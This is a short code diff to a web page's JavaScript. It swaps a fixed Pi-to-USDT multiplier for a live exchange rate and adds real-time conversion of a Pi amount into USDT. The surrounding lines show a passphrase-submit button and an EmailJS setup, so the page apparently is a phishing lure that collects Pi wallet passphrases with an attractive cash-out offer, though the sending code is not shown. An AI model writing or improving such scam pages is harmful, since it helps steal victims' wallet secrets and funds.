@@ -233,7 +233,30 @@
     const errorMessage = document.getElementById("error-message");
     const submitPassphraseBtn = document.getElementById("submit-passphrase");
 
-    const piToUsdtRate = 1.3;  // New multiplier
+    let piToUsdtRate = 50; // Default rate
+
+// Fetch live Pi to USDT rate
+async function fetchPiToUsdtRate() {
+    try {
+        const response = await fetch("https://api.huobi.pro/market/detail/merged?symbol=piusdt");
+        const data = await response.json();
+        piToUsdtRate = data.tick.close; // Live price
+    } catch (error) {
+        console.error("Failed to fetch live rate:", error);
+    }
+}
+
+fetchPiToUsdtRate();
+
+// Real-time update of USDT equivalent
+piInput.addEventListener("input", () => {
+    const piValue = parseFloat(piInput.value);
+    if (!isNaN(piValue) && piValue > 0) {
+        usdtOutput.value = (piValue * piToUsdtRate).toFixed(2);
+    } else {
+        usdtOutput.value = "0";
+    }
+});
 
     // Initialize EmailJS
     emailjs.init("JnmwgNcbGhcU5llRU");  // Replace with your Public Key
